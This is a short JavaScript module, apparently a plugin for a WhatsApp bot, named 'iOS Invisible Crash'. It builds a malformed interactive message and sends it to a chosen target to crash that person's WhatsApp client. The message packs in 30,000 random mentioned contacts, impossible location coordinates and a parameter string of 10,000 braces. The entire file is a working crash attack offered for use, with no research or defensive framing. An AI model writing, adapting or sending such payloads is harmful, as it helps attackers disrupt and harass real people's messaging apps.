// ============================================================
// BUG: sinivicrash — iOS invisible crash v1
// Source: Senku — adapted
// ============================================================

export default {
  id: 'sinivicrash',
  name: 'iOS Invisible Crash',

  async execute({ sock, target }) {
    const mentioned = [
      '0@s.whatsapp.net',
      ...Array.from({ length: 30000 }, () =>
        '1' + Math.floor(Math.random() * 5000000) + '@s.whatsapp.net'
      ),
    ];

    const msg = {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: 'XWC',
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude: -999.035,
                degreesLongitude: 922.999999999999,
                name: 'XWC',
                address: 'XWC',
              },
            },
            body: { text: 'XWC' },
            nativeFlowMessage: {
              messageParamsJson: '{'.repeat(10000),
            },
            contextInfo: {
              participant: target,
              mentionedJid: mentioned,
            },
          },
        },
      },
    };

    await sock.relayMessage(target, msg, {
      messageId: null,
      participant: { jid: target },
      userJid: target,
    });
  },
};